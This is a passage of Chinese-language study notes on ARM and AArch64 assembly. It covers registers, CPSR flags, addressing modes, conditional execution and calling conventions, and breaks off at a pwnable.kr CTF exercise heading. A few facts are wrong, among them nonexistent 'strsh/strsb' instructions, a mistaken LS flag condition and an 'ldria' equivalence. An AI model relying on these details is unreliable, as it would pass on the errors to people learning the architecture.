V7-M</td></tr></tbody></table><h3 id="ARM数据类型与寄存器"><a href="#ARM数据类型与寄存器" class="headerlink" title="ARM数据类型与寄存器"></a>ARM数据类型与寄存器</h3><h4 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h4><p>对于32bit ARM有带符号和不带符号的“字，半字，字节”这三种尺寸，对于”半字“由<code>-h</code>或<code>-sh</code>表示，对于”字节“由<code>-b</code>和<code>-sb</code>表示，字没有符号表示，默认就是”字“。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">ldr &#x3D; Load Word</span><br><span class="line">ldrh &#x3D; Load unsigned Half Word</span><br><span class="line">ldrsh &#x3D; Load signed Half Word</span><br><span class="line">ldrb &#x3D; Load unsigned Byte</span><br><span class="line">ldrsb &#x3D; Load signed Bytes</span><br><span class="line"></span><br><span class="line">str &#x3D; Store Word</span><br><span class="line">strh &#x3D; Store unsigned Half Word</span><br><span class="line">strsh &#x3D; Store signed Half Word</span><br><span class="line">strb &#x3D; Store unsigned Byte</span><br><span class="line">strsb &#x3D; Store signed Byte</span><br></pre></td></tr></table></figure><h4 id="大小端"><a href="#大小端" class="headerlink" title="大小端"></a>大小端</h4><p>指令固定小端存储（？存疑），数据访问大小端都可以，大小端由CPSR(Current Program Status Register)寄存器的bit9控制。</p><h4 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h4><p>由16个用户可用的寄存器，其他寄存器需要特权模式使用。这16寄存器可以分成两组，通用寄存器和特殊用途寄存器。</p><table><thead><tr><th>#</th><th>Alias</th><th>Purpose</th></tr></thead><tbody><tr><td>R0</td><td>-</td><td>General purpose</td></tr><tr><td>R1</td><td>-</td><td>General purpose</td></tr><tr><td>R2</td><td>-</td><td>General purpose</td></tr><tr><td>R3</td><td>-</td><td>General purpose</td></tr><tr><td>R4</td><td>-</td><td>General purpose</td></tr><tr><td>R5</td><td>-</td><td>General purpose</td></tr><tr><td>R6</td><td>-</td><td>General purpose</td></tr><tr><td>R7</td><td>-</td><td>Holds Syscall Number</td></tr><tr><td>R8</td><td>-</td><td>General purpose</td></tr><tr><td>R9</td><td>-</td><td>General purpose</td></tr><tr><td>R10</td><td>-</td><td>General purpose</td></tr><tr><td>R11</td><td>FP</td><td>Frame Pointer</td></tr><tr><td><strong>Special</strong></td><td><strong>Purpose</strong></td><td><strong>Registers</strong></td></tr><tr><td>R12</td><td>IP</td><td>Intra Procedural Call</td></tr><tr><td>R13</td><td>SP</td><td>Stack Pointer</td></tr><tr><td>R14</td><td>LR</td><td>Link Register</td></tr><tr><td>R15</td><td>PC</td><td>Program Counter</td></tr><tr><td>CPSR</td><td>-</td><td>Current Program Status Registers</td></tr></tbody></table><p>R0-R12：用来存储临时数据，指针等。例如：R0当作累加器在算数运算期间，也可以存储函数返回值。R7在系统调用时用来存储系统调用号。R11用来跟踪栈帧的边界。R0-R3存储调用的前四个参数。</p><p>R13：SP指向栈顶，函数返回时恢复。</p><p>R14：LR指向函数调用处的下一条指令，类似储存函数返回地址。</p><p>R15：PC自加，ARM模式每次+4，THUMB模式每次+2（？存疑），在执行期间PC存储当前指令地址+8的地方（为了兼容老型号，老型号会预取2条指令），THUMB则是+4.</p><h4 id="CPSR"><a href="#CPSR" class="headerlink" title="CPSR"></a>CPSR</h4><p><img src="https://raw.githubusercontent.com/clxsh/pics/master/img20201010001303.png"></p><p>左侧是最高有效位，右侧是最低有效位。</p><table><thead><tr><th align="left">Flag</th><th align="left">Description</th></tr></thead><tbody><tr><td align="left">N (Negative)</td><td align="left">使能当指令产生负数</td></tr><tr><td align="left">Z (Zero)</td><td align="left">使能当指令产生0</td></tr><tr><td align="left">C (Carry)</td><td align="left">使能如果指令产生的结果需要33bit</td></tr><tr><td align="left">V (Overflow)</td><td align="left">使能如果指令产生的结果32bit不够用</td></tr><tr><td align="left">E (Endian-bit)</td><td align="left">标识大小端，0小端1大端</td></tr><tr><td align="left">T (Thumb-bit)</td><td align="left">标识ARM或THUMB模式</td></tr><tr><td align="left">M (Mode-bits)</td><td align="left">标识特权级别(USR, SVC, etc.).</td></tr><tr><td align="left">J (Jazelle)</td><td align="left">允许ARM硬件执行java字节码</td></tr></tbody></table><p>N：在结果是有符号的二进制补码情况下，如果结果为负数，则N=1；如果结果为非负数，则N=0。</p><p>Z：如果结果为0，则Z=1;如果结果为非零，则Z=0。</p><p>C：其设置分一下几种情况：</p><p>对于加法指令（包含比较指令CMN），如果产生进位，则C=1;否则C=0。</p><p>对于减法指令（包括比较指令CMP），如果产生借位，则C=0;否则C=1。</p><p>对于有移位操作的非法指令，C为移位操作中最后移出位的值。</p><p>对于其他指令，C通常不变。</p><p>V：对于加减法指令，在操作数和结果是有符号的整数时，如果发生溢出，则V=1;如果无溢出发生，则V=0;对于其他指令，V通常不发生变化。</p><p>假设现在用 <code>cmp</code> 指令来比较 <code>1</code> 和 <code>2</code> ，<code>cmp</code> 会进行减法运算 <code>1 - 2 = -1</code> 结果为负数，这时这个运算结果就会影响到 <code>CPSR</code> 的 <code>N</code> 标志位，因为 <code>cmp</code> 的运算结果是负数所以会把 <code>N</code> 置为 <code>1</code>，如果是比较 <code>2</code> 和 <code>2</code> 运算结果是 <code>0</code> 这会置位 <code>Z</code> 标志位，但是要注意一点是 <code>cmp</code> 的执行结果不会影响它使用的寄存器只会 <strong>隐式</strong> 地影响 <code>CPSR</code> 寄存器的值。</p><h4 id="APSR"><a href="#APSR" class="headerlink" title="APSR"></a>APSR</h4><p>包含<code>N</code>, <code>Z</code>, <code>C</code>, <code>V</code>这几个运算标志位。</p><p><code>C</code>出现的条件：</p><ol><li>加法运算结果大于等于2^32</li><li>减法运算结果是正数或0</li><li>桶式移位的结果，在move或者逻辑指令</li></ol><h3 id="ARM指令集"><a href="#ARM指令集" class="headerlink" title="ARM指令集"></a>ARM指令集</h3><h4 id="ARM-和-THUMB"><a href="#ARM-和-THUMB" class="headerlink" title="ARM 和 THUMB"></a>ARM 和 THUMB</h4><p>ARM和THUMB主要是指令集方面的不同，ARM指令是32bit的，THUMB指令是16bit(可以是32bit)，编写shellcode需要避免null byte，使用THUMB可以减少null byte的概率。</p><p>THUMB指令集不同版本之间差异较大，不必细究，具体版本具体查阅<a href="http://infocenter.arm.com/help/index.jsp">infocenter</a>就可以。</p><p>THUMB版本：Thumb-1，Thumb-2，ThumbEE。不同名称只为区分指令集，处理器总是称之为Thumb。</p><p><strong>ARM和Thumb的不同：</strong></p><ul><li>条件执行，所有的ARM指令都支持条件执行，Thumb不支持（一些版本使用<code>IT</code>指令支持）。</li><li>32bit的ARM和Thumb指令，Thumb指令有<code>.w</code>后缀。</li><li>桶式移位是ARM模式的一个特征，将多条指令合为一条。</li></ul><p>切换模式：使用<code>BX</code>或者<code>BLX</code>指令，并且设置目标地址+1，不必担心对齐。可以通过CPSR寄存器知晓目前的模式。</p><h4 id="ARM汇编简介"><a href="#ARM汇编简介" class="headerlink" title="ARM汇编简介"></a>ARM汇编简介</h4><p>指令模板：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MNEMONIC&#123;S&#125;&#123;condition&#125; &#123;Rd&#125;, Operand1, Operand2</span><br></pre></td></tr></table></figure><ul><li>MNEMONIC 指令名称</li><li>{S} 可选项。如果给出，就将会根据结果更新条件flag</li><li>{condition} 执行该条命令所需要满足的条件。</li><li>{Rd} 目标寄存器，存储指令的结果。</li><li>Operand1 参数一，可以是寄存器或者立即数</li><li>Operand2 参数二，可以是立即数或者寄存器（寄存器可以进行可选的移位）</li></ul><p>参数二的概念有些复杂，给出参数二的几个示例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#123                    - 立即数</span><br><span class="line">Rx                      - 寄存器X</span><br><span class="line">Rx, ASR n               - 寄存器X算数右移n位 (1 &#x3D; n &#x3D; 32)</span><br><span class="line">Rx, LSL n               - 寄存器X逻辑左移n位 (0 &#x3D; n &#x3D; 31)</span><br><span class="line">Rx, LSR n               - 寄存器X逻辑左移n位 n bits (1 &#x3D; n &#x3D; 32)</span><br><span class="line">Rx, ROR n               - 寄存器X循环右移n位 (1 &#x3D; n &#x3D; 31)</span><br><span class="line">Rx, RRX                 - 寄存器X循环右移1位, with extend？</span><br></pre></td></tr></table></figure><p>指令示例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ADD   R0, R1, R2         - R0 &#x3D; R1 + R2</span><br><span class="line">ADD   R0, R1, #2         - R0 &#x3D; R1 + 2</span><br><span class="line">MOVLE R0, #5             - 当作MOVLE R0, R0, #5; if less or equal: R0 &#x3D; 5</span><br><span class="line">MOV   R0, R1, LSL #1     - R0 &#x3D; R1 &lt;&lt; 1</span><br></pre></td></tr></table></figure><p>常见指令</p><table><thead><tr><th align="center">Instruction</th><th align="left">Description</th><th align="center">Instruction</th><th align="left">Description</th></tr></thead><tbody><tr><td align="center">MOV</td><td align="left">Move data</td><td align="center">EOR</td><td align="left">Bitwise XOR</td></tr><tr><td align="center">MVN</td><td align="left">Move and negate</td><td align="center">LDR</td><td align="left">Load</td></tr><tr><td align="center">ADD</td><td align="left">Addition</td><td align="center">STR</td><td align="left">Store</td></tr><tr><td align="center">SUB</td><td align="left">Subtraction</td><td align="center">LDM</td><td align="left">Load Multiple</td></tr><tr><td align="center">MUL</td><td align="left">Multiplication</td><td align="center">STM</td><td align="left">Store Multiple</td></tr><tr><td align="center">LSL</td><td align="left">Logical Shift Left</td><td align="center">PUSH</td><td align="left">Push on Stack</td></tr><tr><td align="center">LSR</td><td align="left">Logical Shift Right</td><td align="center">POP</td><td align="left">Pop off Stack</td></tr><tr><td align="center">ASR</td><td align="left">Arithmetic Shift Right</td><td align="center">B</td><td align="left">Branch</td></tr><tr><td align="center">ROR</td><td align="left">Rotate Right</td><td align="center">BL</td><td align="left">Branch with Link</td></tr><tr><td align="center">CMP</td><td align="left">Compare</td><td align="center">BX</td><td align="left">Branch and eXchange</td></tr><tr><td align="center">AND</td><td align="left">Bitwise AND</td><td align="center">BLX</td><td align="left">Branch with Link and eXchange</td></tr><tr><td align="center">ORR</td><td align="left">Bitwise OR</td><td align="center">SWI/SVC</td><td align="left">System Call</td></tr></tbody></table><h3 id="数据存储LOAD-STORE"><a href="#数据存储LOAD-STORE" class="headerlink" title="数据存储LOAD STORE"></a>数据存储LOAD STORE</h3><h4 id="基础示例"><a href="#基础示例" class="headerlink" title="基础示例"></a>基础示例</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">LDR R2, [R0]   将R0所存地址处的数据加载到R2</span><br><span class="line">STR R2, [R1]   将R2存储到R1所指示的地址处</span><br></pre></td></tr></table></figure><p>PC相对寻址。将const数据存储在代码段。注意实际PC预取两条指令。</p><p><img src="https://azeria-labs.com/wp-content/uploads/2017/04/pc-relative1-1.png.pagespeed.ce.hWNi5fEpQV.png" alt="relative addressing"></p><h4 id="立即数偏移寻址"><a href="#立即数偏移寻址" class="headerlink" title="立即数偏移寻址"></a>立即数偏移寻址</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">str r2, [r1, #2]  @ address mode: offset. 将R2数据存储到R1+2地址处</span><br><span class="line">str r2, [r1, #4]! @ address mode: pre-indexed. 将R2数据存储到R1+4地址处，R1&#x3D;R1+4</span><br><span class="line">ldr r3, [r1], #4  @ address mode: post-indexed. 将R1地址处的数据读取到R3，R1&#x3D;R1+4</span><br></pre></td></tr></table></figure><h4 id="寄存器偏移寻址"><a href="#寄存器偏移寻址" class="headerlink" title="寄存器偏移寻址"></a>寄存器偏移寻址</h4><p>和上面一样</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">str r2, [r1, r2]  @ address mode: offset.  </span><br><span class="line">str r2, [r1, r2]! @ address mode: pre-indexed.</span><br><span class="line">ldr r3, [r1], r2  @ address mode: post-indexed.</span><br></pre></td></tr></table></figure><h4 id="scaled寄存器偏移寻址"><a href="#scaled寄存器偏移寻址" class="headerlink" title="scaled寄存器偏移寻址"></a>scaled寄存器偏移寻址</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">str r2, [r1, r2, LSL#2]  @ address mode: offset. R1+R2&lt;&lt;2</span><br><span class="line">str r2, [r1, r2, LSL#2]! @ address mode: pre-indexed. R1 &#x3D; R1 + R2&lt;&lt;2</span><br><span class="line">ldr r3, [r1], r2, LSL#2  @ address mode: post-indexed. R1 &#x3D; R1 + R2&lt;&lt;2</span><br></pre></td></tr></table></figure><h4 id="PC偏移"><a href="#PC偏移" class="headerlink" title="PC偏移"></a>PC偏移</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.section .text</span><br><span class="line">.global _start</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line">   ldr r0, &#x3D;jump        &#x2F;* load the address of the function label jump into R0 *&#x2F;</span><br><span class="line">   ldr r1, &#x3D;0x68DB00AD  &#x2F;* load the value 0x68DB00AD into R1 *&#x2F;</span><br><span class="line">jump:</span><br><span class="line">   ldr r2, &#x3D;511         &#x2F;* load the value 511 into R2 *&#x2F; </span><br><span class="line">   bkpt</span><br></pre></td></tr></table></figure><p>伪指令，一条指令转移32 bit数据。实际上ARM一条指令只能加载8bit数据。</p><h4 id="立即数"><a href="#立即数" class="headerlink" title="立即数"></a>立即数</h4><p>因为ARM指令都是固定的32bit，所以去除condition code，opcode等等，就只剩了12bit给立即数用。也不是直接用12bit存储4096个数字。而是4bit作为循环右移的次数(r)，8bit作为数字(n)，最终立即数的value = n ror (r*2)。可以看到所能表示的数字局限性很大，只能表示8bit数字循环右移偶数次的数字，且右移次数在[0, 30]之间。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Valid values:</span><br><span class="line">#256        &#x2F;&#x2F; 1 ror 24 --&gt; 256</span><br><span class="line">#384        &#x2F;&#x2F; 6 ror 26 --&gt; 384</span><br><span class="line">#484        &#x2F;&#x2F; 121 ror 30 --&gt; 484</span><br><span class="line">#16384      &#x2F;&#x2F; 1 ror 18 --&gt; 16384</span><br><span class="line">#2030043136 &#x2F;&#x2F; 121 ror 8 --&gt; 2030043136</span><br><span class="line">#0x06000000 &#x2F;&#x2F; 6 ror 8 --&gt; 100663296 (0x06000000 in hex)</span><br><span class="line"></span><br><span class="line">Invalid values:</span><br><span class="line">#370        &#x2F;&#x2F; 185 ror 31 --&gt; 31 is not in range (0 – 30)</span><br><span class="line">#511        &#x2F;&#x2F; 1 1111 1111 --&gt; bit-pattern can’t fit into one byte</span><br><span class="line">#0x06010000 &#x2F;&#x2F; 1 1000 0001.. --&gt; bit-pattern can’t fit into one byte</span><br></pre></td></tr></table></figure><p><strong>避免方法</strong></p><ol><li>使用小数字构建大数字，如：不使用<code>MOV  r0, #511</code>，而是使用<code>MOV r0, #256, and ADD r0, #255</code></li><li>使用<code>LDR r1, =511</code>，让编译器替你转换成mov指令或者PC偏移加载。</li></ol><h3 id="LOAD-STORE-多个"><a href="#LOAD-STORE-多个" class="headerlink" title="LOAD STORE 多个"></a>LOAD STORE 多个</h3><p><code>LDM</code>, <code>STM</code>，有后缀<code>-IA</code>（Increase After）, <code>IB</code>（Increase Before）, <code>DA</code>（Decrease After）, <code>DB</code>（Decrease Before）。</p><p><code>LDM</code> 相当于 <code>LDMIA</code></p><p>示例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ldm r0, &#123;r4,r5&#125;    &#x2F;* 分别读取R0，R0+4地址处的数据到R4，R5 *&#x2F;</span><br><span class="line">stm r0, &#123;r4,r5&#125;    &#x2F;* 将R4，R5存储到R0，R0+4地址处</span><br><span class="line">ldmib r0, &#123;r4-r6&#125;  &#x2F;* 分别读取R0+4, R0+8, R0+12地址处的数据到R4, R5, R6 *&#x2F;</span><br><span class="line">stmib r1, &#123;r4-r6&#125;  &#x2F;* 同理 *&#x2F;</span><br><span class="line">ldmda r0, &#123;r4-r6&#125;  &#x2F;* 分别读取R0-8, R0-4, R0地址处的数据到R4, R5, R6。数字大的寄存器对应高地址数据*&#x2F;</span><br><span class="line">ldmdb r0, &#123;r4-r6&#125;  &#x2F;* 同理 *&#x2F;</span><br><span class="line">stmda r2, &#123;r4-r6&#125;  &#x2F;* 将R4, R5, R6分别存储到R2-8, R2-4, R2地址处</span><br></pre></td></tr></table></figure><h4 id="push-pop"><a href="#push-pop" class="headerlink" title="push pop"></a>push pop</h4><p><code>push</code>：sp-4, store</p><p><code>pop</code>：load，sp+4</p><p><code>push &#123;r0,r1&#125;</code>相当于<code>stmdb sp!, &#123;r0,r1&#125;</code></p><p><code>pop &#123;r2, r3&#125;</code>相当于<code>ldria sp!, &#123;r2,r3&#125;</code></p><h3 id="条件执行与分支"><a href="#条件执行与分支" class="headerlink" title="条件执行与分支"></a>条件执行与分支</h3><h4 id="条件执行"><a href="#条件执行" class="headerlink" title="条件执行"></a>条件执行</h4><table><thead><tr><th align="center">Condition Code</th><th align="left">Meaning (for cmp or subs)</th><th align="center">Status of Flags</th></tr></thead><tbody><tr><td align="center">EQ</td><td align="left">Equal</td><td align="center">Z==1</td></tr><tr><td align="center">NE</td><td align="left">Not Equal</td><td align="center">Z==0</td></tr><tr><td align="center">GT</td><td align="left">Signed Greater Than</td><td align="center">(Z==0) &amp;&amp; (N==V)</td></tr><tr><td align="center">LT</td><td align="left">Signed Less Than</td><td align="center">N!=V</td></tr><tr><td align="center">GE</td><td align="left">Signed Greater Than or Equal</td><td align="center">N==V</td></tr><tr><td align="center">LE</td><td align="left">Signed Less Than or Equal</td><td align="center">(Z==1) || (N!=V)</td></tr><tr><td align="center">CS or HS</td><td align="left">Unsigned Higher or Same (or Carry Set)</td><td align="center">C==1</td></tr><tr><td align="center">CC or LO</td><td align="left">Unsigned Lower (or Carry Clear)</td><td align="center">C==0</td></tr><tr><td align="center">MI</td><td align="left">Negative (or Minus)</td><td align="center">N==1</td></tr><tr><td align="center">PL</td><td align="left">Positive (or Plus)</td><td align="center">N==0</td></tr><tr><td align="center">AL</td><td align="left">Always executed</td><td align="center">–</td></tr><tr><td align="center">NV</td><td align="left">Never executed</td><td align="center">–</td></tr><tr><td align="center">VS</td><td align="left">Signed Overflow</td><td align="center">V==1</td></tr><tr><td align="center">VC</td><td align="left">No signed Overflow</td><td align="center">V==0</td></tr><tr><td align="center">HI</td><td align="left">Unsigned Higher</td><td align="center">(C==1) &amp;&amp; (Z==0)</td></tr><tr><td align="center">LS</td><td align="left">Unsigned Lower or same</td><td align="center">(C==0) || (Z==0)</td></tr></tbody></table><h4 id="Thumb中的条件执行"><a href="#Thumb中的条件执行" class="headerlink" title="Thumb中的条件执行"></a>Thumb中的条件执行</h4><p>Thumb-2有条件执行指令<code>IT</code>，其最多允许4条指令。</p><ul><li>IT refers to If-Then (next instruction is conditional)</li><li>ITT refers to If-Then-Then (next 2 instructions are conditional)</li><li>ITE refers to If-Then-Else (next 2 instructions are conditional)</li><li>ITTE refers to If-Then-Then-Else (next 3 instructions are conditional)</li><li>ITTEE refers to If-Then-Then-Else-Else (next 4 instructions are conditional)</li></ul><p>其实就是if–else语句，else的逻辑必须与if<strong>相反</strong>。if成立执行一条或两条指令，else成立就执行else一条或两条指令。示例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">ITTE   NE           ; Next 3 instructions are conditional</span><br><span class="line">ANDNE  R0, R0, R1   ; ANDNE does not update condition flags</span><br><span class="line">ADDSNE R2, R2, #1   ; ADDSNE updates condition flags</span><br><span class="line">MOVEQ  R2, R3       ; Conditional move</span><br><span class="line"></span><br><span class="line">ITE    GT           ; Next 2 instructions are conditional</span><br><span class="line">ADDGT  R1, R0, #55  ; Conditional addition in case the GT is true</span><br><span class="line">ADDLE  R1, R0, #48  ; Conditional addition in case the GT is not true</span><br><span class="line"></span><br><span class="line">ITTEE  EQ           ; Next 4 instructions are conditional</span><br><span class="line">MOVEQ  R0, R1       ; Conditional MOV</span><br><span class="line">ADDEQ  R2, R2, #10  ; Conditional ADD</span><br><span class="line">ANDNE  R3, R3, #1   ; Conditional AND</span><br><span class="line">BNE.W  dloop        ; Branch instruction can only be used in the last instruction of an IT block</span><br></pre></td></tr></table></figure><p>相反的条件：</p><table><thead><tr><th align="center">Condition Code</th><th align="center">Opposite</th><th align="center"></th><th align="center"></th></tr></thead><tbody><tr><td align="center">Code</td><td align="center">Meaning</td><td align="center">Code</td><td align="center">Meaning</td></tr><tr><td align="center">EQ</td><td align="center">Equal</td><td align="center">NE</td><td align="center">Not Equal</td></tr><tr><td align="center">HS (or CS)</td><td align="center">Unsigned higher or same (or carry set)</td><td align="center">LO (or CC)</td><td align="center">Unsigned lower (or carry clear)</td></tr><tr><td align="center">MI</td><td align="center">Negative</td><td align="center">PL</td><td align="center">Positive or Zero</td></tr><tr><td align="center">VS</td><td align="center">Signed Overflow</td><td align="center">VC</td><td align="center">No Signed Overflow</td></tr><tr><td align="center">HI</td><td align="center">Unsigned Higher</td><td align="center">LS</td><td align="center">Unsigned Lower or Same</td></tr><tr><td align="center">GE</td><td align="center">Signed Greater Than or Equal</td><td align="center">LT</td><td align="center">Signed Less Than</td></tr><tr><td align="center">GT</td><td align="center">Signed Greater Than</td><td align="center">LE</td><td align="center">Signed Less Than or Equal</td></tr><tr><td align="center">AL (or omitted)</td><td align="center">Always Executed</td><td align="center">There is no opposite to AL</td><td align="center"></td></tr></tbody></table><h4 id="B-BL-BX-BLX"><a href="#B-BL-BX-BLX" class="headerlink" title="B/BL/BX/BLX"></a>B/BL/BX/BLX</h4><p>L: link</p><p>X: Exchange</p><ul><li>B，就是普通的跳转</li><li>BL，跳转并且把PC+4存储到LR寄存器。（实际调试发现，这里的PC不是+8之后的，存储的返回地址</li><li>BX，BLX，<code>X</code>就是转换ARM/THUMB模式的意思</li></ul><p>示例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">.text</span><br><span class="line">.global _start</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line">     .code 32         @ ARM mode</span><br><span class="line">     add r2, pc, #1   @ put PC+1 into R2，此时实际PC指向mov r0,r1指令开始处（PC+8），所以bx可以直接跳过去</span><br><span class="line">     bx r2            @ branch + exchange to R2</span><br><span class="line"></span><br><span class="line">    .code 16          @ Thumb mode</span><br><span class="line">     mov r0, #1</span><br></pre></td></tr></table></figure><h4 id="条件分支"><a href="#条件分支" class="headerlink" title="条件分支"></a>条件分支</h4><p>给分支加上条件，如：<code>BEQ</code></p><h3 id="栈和函数"><a href="#栈和函数" class="headerlink" title="栈和函数"></a>栈和函数</h3><h4 id="栈"><a href="#栈" class="headerlink" title="栈"></a>栈</h4><p>栈的类型：full ascending, full descending, empty ascending, empty descending</p><p>full/empty：sp指向是否有数据</p><p>ascending/descending：栈长的方向</p><p>ARM是full descending</p><h4 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h4><p><strong>prologue</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">push   &#123;r11, lr&#125;    &#x2F;* Start of the prologue. Saving Frame Pointer and LR onto the stack *&#x2F;</span><br><span class="line">add    r11, sp, #0  &#x2F;* Setting up the bottom of the stack frame *&#x2F;</span><br><span class="line">sub    sp, sp, #16  &#x2F;* End of the prologue. Allocating some buffer on the stack. This also allocates space for the Stack Frame *&#x2F;</span><br></pre></td></tr></table></figure><p>保存前一个R11和程序返回地址。（BL指令，跳转向指定地址，并将返回地址存储于lr，由被调用者保存lr）</p><p>保存栈帧</p><p>创建函数所需栈空间</p><p><strong>body</strong></p><p>函数逻辑</p><p><strong>epilogue</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sub    sp, r11, #0  &#x2F;* Start of the epilogue. Readjusting the Stack Pointer *&#x2F;</span><br><span class="line">pop    &#123;r11, pc&#125;    &#x2F;* End of the epilogue. Restoring Frame Pointer from the Stack, jumping to previously saved LR via direct load into PC. The Stack Frame of a function is finally destroyed at this step. *&#x2F;</span><br></pre></td></tr></table></figure><p>恢复SP，取出r11和返回地址。</p><h4 id="叶子函数与非叶子函数"><a href="#叶子函数与非叶子函数" class="headerlink" title="叶子函数与非叶子函数"></a>叶子函数与非叶子函数</h4><p>叶子函数：函数中不会再调用其他函数</p><p>非叶子函数：相反。</p><p>叶子函数因为不会再调用，LR寄存器不会再改变，所以不必保存LR寄存器。叶子函数的最后使用<code>bx lr</code>跳转回去就可以。</p><p><code>bx</code>在地址最低位设置为1的情况下才会进行ARM/THUMB模式的转换，否则不会改变只是跳转。</p><h3 id="aarch64"><a href="#aarch64" class="headerlink" title="aarch64"></a>aarch64</h3><p>AArch拥有31个通用寄存器，系统运行在64位状态下的时候名字叫Xn，运行在32位的时候就叫Wn。</p><table><thead><tr><th align="center">寄存器</th><th align="center">别名</th><th align="center">意义</th></tr></thead><tbody><tr><td align="center">SP</td><td align="center">–</td><td align="center">Stack Pointer:栈指针</td></tr><tr><td align="center">R30</td><td align="center">LR</td><td align="center">Link Register:在调用函数时候，保存下一条要执行指令的地址。</td></tr><tr><td align="center">R29</td><td align="center">FP</td><td align="center">Frame Pointer:保存函数栈的基地址。</td></tr><tr><td align="center">R19-R28</td><td align="center">–</td><td align="center">Callee-saved registers（含义见上面术语解释）</td></tr><tr><td align="center">R18</td><td align="center">–</td><td align="center">平台寄存器，有特定平台解释其用法。</td></tr><tr><td align="center">R17</td><td align="center">IP1</td><td align="center">The second intra-procedure-call temporary register……</td></tr><tr><td align="center">R16</td><td align="center">IP0</td><td align="center">The first intra-procedure-call temporary register……</td></tr><tr><td align="center">R9-R15</td><td align="center">–</td><td align="center">临时寄存器</td></tr><tr><td align="center">R8</td><td align="center">–</td><td align="center">在一些情况下，返回值是通过R8返回的</td></tr><tr><td align="center">R0-R7</td><td align="center">–</td><td align="center">在函数调用过程中传递参数和返回值</td></tr><tr><td align="center">NZCV</td><td align="center">–</td><td align="center">状态寄存器：N（Negative）负数 Z(Zero) 零 C(Carry) 进位 V(Overflow) 溢出</td></tr></tbody></table><h2 id="ARM函数调用约定"><a href="#ARM函数调用约定" class="headerlink" title="ARM函数调用约定"></a>ARM函数调用约定</h2><p>ARM/ARM64使用的是AAPCS或ATPCS标准。</p><p>ATPCS即为ARM-Thumb Procedure Call Standard/ARM-Thumb过程调用标准，规定了一些子程序间调用的基本规则，这些规则包括子程序调用过程中寄存器的使用规则，数据栈的使用规则，参数的传递规则。有了这些规则之后，单独编译的C语言程序就可以和汇编程序相互调用。使用ADS(ARM Developer Suite)的C语言编译器编译的C语言子程序满足用户指定的ATPCS类型。而对于汇编语言来说，则需要用户来保证各个子程序满足ATPCS的要求。</p><p>而AAPCS即为ARM Archtecture Procedure Call Standard是2007年ARM公司正式推出的新标准，AAPCS是ATPCS的改进版，目前， AAPCS和ATPCS都是可用的标准。</p><p>arm 的参数 1 ~ 4 分别保存到 r0 ~ r3 寄存器中, 剩下的参数从右向左依次入栈, 被调用者实现栈平衡, 返回值存放在 r0 中。</p><p><img src="https://courses.washington.edu/cp105/_images/ARM_Calling_Convention.png" alt="arm call convention"></p><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><h3 id="pwnable-kr-leg"><a href="#pwnable-kr-leg" class="headerlink" title="pwnable.kr leg"></a>pwnable.kr leg</h3><p>该题目就是考察PC预取两条指令。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span 